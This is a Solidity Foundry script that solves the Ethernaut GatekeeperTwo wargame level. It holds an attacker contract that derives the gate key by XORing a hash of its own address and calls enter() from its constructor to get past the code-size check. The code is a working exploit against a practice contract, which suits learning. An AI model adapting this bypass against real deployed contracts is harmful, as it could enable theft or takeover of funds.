// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level14.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackCont {
    GatekeeperTwo public gatekeeperTwo =
        GatekeeperTwo(0x58C8f49bbabbD90f5E9e85f40F022291B8A9aD25);

    constructor() {
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        gatekeeperTwo.enter(gateKey);
    }

    function callmodGatethree() external view returns (uint64, uint64) {
        return (
            uint64(
                bytes8(
                    keccak256(
                        abi.encodePacked(
                            0xBD008DB3d8704Ce124fcd13E448E950B409e07E1
                        )
                    )
                )
            ),
            type(uint64).max
        );
    }
    function callmodGatethree2(bytes8 _gateKey) external view returns (bool) {
        return
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
            type(uint64).max;
    }
}

contract GatekeeperTwoSolution is Script {
    GatekeeperTwo public gatekeeperTwo =
        GatekeeperTwo(0x58C8f49bbabbD90f5E9e85f40F022291B8A9aD25);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        gatekeeperTwo.entrant();
        AttackCont attackCont = new AttackCont();
        gatekeeperTwo.entrant();
        vm.stopBroadcast();
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        bytes32 data = bytes32(value);
        bytes memory alphabet = "0123456789abcdef";
        bytes memory str = new bytes(2 + 64);
        str[0] = "0";
        str[1] = "x";
        for (uint256 i = 0; i < 32; i++) {
            str[2 + i * 2] = alphabet[uint8(data[i] >> 4) & 0xf];
            str[3 + i * 2] = alphabet[uint8(data[i]) & 0xf];
        }
        return string(str);
    }
}
